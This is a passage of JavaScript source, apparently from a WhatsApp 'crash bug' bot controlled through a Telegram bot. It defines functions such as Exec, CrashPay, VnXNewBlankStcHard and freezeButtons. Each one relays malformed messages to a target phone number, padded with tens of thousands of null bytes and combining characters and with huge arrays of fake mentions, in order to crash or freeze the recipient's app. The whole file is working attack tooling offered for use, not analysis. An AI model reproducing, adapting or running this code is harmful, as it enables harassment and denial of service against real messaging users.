        nativeFlowResponseMessage: {
          name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 99999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
        },
      },
    },
  },
}, { participant: { jid: target }});
}

async function Exec(sock, target) {
  let Exec = 1;
  for (let i = 0; i < Exec; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 10; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "null",
          "body": "xxx",
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 40; i++) {
      push.push({
        "body": {
          "text": "\u0000" + "\u0000".repeat(5500)
        },
        "footer": {
          "text": ""
        },
        "header": {
          "title": 'RxVz' + "\u0000".repeat(4000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAIAQEAATAAAEDoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "groupStatusMessageV2": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "饾憛饾憢饾憠饾憤隆" + "\u0000".repeat(52000)
            },
            "footer": {
              "text": "\u0000"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    const msg = {
      groupStatusMessage: {
        message: {
          extendedTextMessage: {
            text: "饾悞饾惐饾悅" + "\u0000".repeat(60000) + "\x10".repeat(60000),
            contextInfo: {
              remoteJid: "status@broadcast",
              statusMentionSources: Array.from({ length: 25000 }, (_, n) => ({ 
                participant: `62${n + 8921019}@s.whatsapp.net` 
              })),
              mentionedJid: [
                "0@s.whatsapp.net", 
                ...Array.from({ length: 2000 }, () => "1" + Math.floor(5E6 * Math.random()) + "@s.whatsapp.net")
              ]
            }
          }
        }
      }
    };
    
    await sock.relayMessage(target, msg, {
      participant: { jid: target },
      messageId: null,
    });
    
    await sock.relayMessage(target, carousel.message, {
      participant: { jid: target },
      messageId: carousel.key.id
    });
  }
}

async function VnXNewBlankStcHard(sock, target) {
  const MbgTk = {
    viewOnceMessage: {
      message: {
        stickerPackMessage: {
          stickerPackId: 'bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5',
          name: '༑ Nihk Bng' + 'ꦾ'.repeat(55000),
          publisher: 'ꦽ'.repeat(45000),
          stickers: [],
          fileLength: 12260,
          fileSha256: 'G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=',
          fileEncSha256: '2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=',
          mediaKey: 'rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=',
          directPath:
            '/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw',
          height: 9999,
          width: 9999,
          mediaKeyTimestamp: '1747502082',
          isAnimated: false,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          emojis: ['🕸', '🕷', '🦠', '🌹'],
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 1,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 60,
              },
            },
          },
        },
      },
    },
  };

  try {
    await sock.relayMessage(target, MbgTk, { participant: { jid: target } });
    console.log(`message success to ${target}`);
  } catch (e) {
    console.log('❌ Error Strike:', e);
  }
}

async function CrashPay(sock, target) {
    try {
        await sock.relayMessage(target, {
            interactiveMessage: {
                body: {
                    text: "Ghsot Is Here"
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: "send_payment",
                            buttonParamsJson: JSON.stringify({
                                display_text: "\u0000".repeat(1500),
                                amount: Infinity,
                                currency: "\u200B".repeat(8000),
                                merchant: "\u600B".repeat(6000),
                                note: "\u0000".repeat(4000)
                            })
                        },
                        {
                            name: "cta_call",
                            buttonParamsJson: JSON.stringify({
                                display_text: "\u200B".repeat(1200),
                                phone_number: "\u0000".repeat(60) + "0".repeat(40),
                                call_type: "video"
                            })
                        }
                    ],
                    version: 9999
                }
            }
        }, { participant: { jid: target } });
        
        console.log(`Sukses Mengirim Crash Pay Ke ${target}`);

        
    } catch (err) {
        console.error(`Error : ${err.message}`);
    }
}

async function freezeButtons(sock, target) {
    try {
        const back = "ꦾ";
        const Exec = "ꦽ";
        const Msg = {
            buttonsMessage: {
                contentText: `Exec!¿`,
                footerText: `¡?`,
                headerType: 1,
                buttons: [
                    {
                        buttonId: 'btn1',
                        buttonText: {
                            displayText: `${back.repeat(30000)}${Exec.repeat(30000)}`
                        },
                        type: 1
                    },
                    {
                        buttonId: 'btn2', 
                        buttonText: {
                            displayText: `${back.repeat(30000)}${Exec.repeat(30000)}`
                        },
                        type: 1
                    }
                ],
                contextInfo: {
                    mentionedJid: [
                        target,
                        ...Array.from({ length: 1000 }, () =>
                            "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                        )
                    ],
                    participant: target,
                    stanzaId: `${back.repeat(150)}${Exec.repeat(150)}`
                }
            }
        };
        await sock.relayMessage(target, Msg, { 
            participant: { jid: target } 
        });
        console.log(`✅ to ${target}`);
        return true;
    } catch (err) {
        console.log(`❌ Error: ${err.message}`);
        return false;
    }
}

(async () => {
  try {
    console.clear();

    const startTime = Date.now();

    const color = (c, t) => `\x1b[${c}m${t}\x1b[0m`;
    const cyan = (t) => color(36, t);
    const green = (t) => color(32, t);
    const red = (t) => color(31, t);
    const yellow = (t) => color(33, t);
    const dim = (t) => color(2, t);

    const line = "════════════════════════════════════";

    const printBox = (title) => {
      console.log(`
╔${line}╗
║   ${title.padEnd(30, " ")}   ║
╚${line}╝
`);
    };

    const logStep = (msg) => console.log(cyan(`➤ ${msg}`));
    const logOk = (label, msg) =>
      console.log(green(`✔ ${label.padEnd(12)} : ${msg}`));

    printBox("⚡ BASE SCRIPT");

    console.log(dim("System initializing\n"));

    currentMode = getMode();
    logOk("Mode", currentMode);

    logStep("Connecting WhatsApp");
    await startSesi();
    logOk("WhatsApp", "Connected");

    logStep("Starting Telegram bot");
    await bot.launch();
    logOk("Telegram", "Active");

    process.once("SIGINT", () => {
      console.log(red("\n🛑 SIGINT — Shutdown initiated"));
      bot.stop("SIGINT");
    });

    process.once("SIGTERM", () => {
      console.log(red("\n🛑 SIGTERM — Shutdown initiated"));
      bot.stop("SIGTERM");
    });

    const uptime = ((Date.now() - startTime) / 1000).toFixed(2);

    console.log(`
╔${line}╗
║        🟢 SYSTEM ONLINE          ║
╠${line}╣
║ ⏱️ Uptime   : ${uptime}s
║ 🔐 Status   : SECURE
║ ⚙️ Engine   : RUNNING
╚${line}╝
`);

  } catch (err) {
    console.clear();

    const red = (t) => `\x1b[31m${t}\x1b[0m`;
    const yellow = (t) => `\x1b[33m${t}\x1b[0m`;

    console.log(`
╔════════════════════════════════════╗
║          ❌ SYSTEM ERROR          ║
╚════════════════════════════════════╝
`);

    console.log(red("⚠️ Unexpected failure :\n"));
    console.error(err);

    setTimeout(() => {
      console.log(yellow("\n🔄 Restarting system"));
      process.exit(1);
    }, 3000);
  }
})();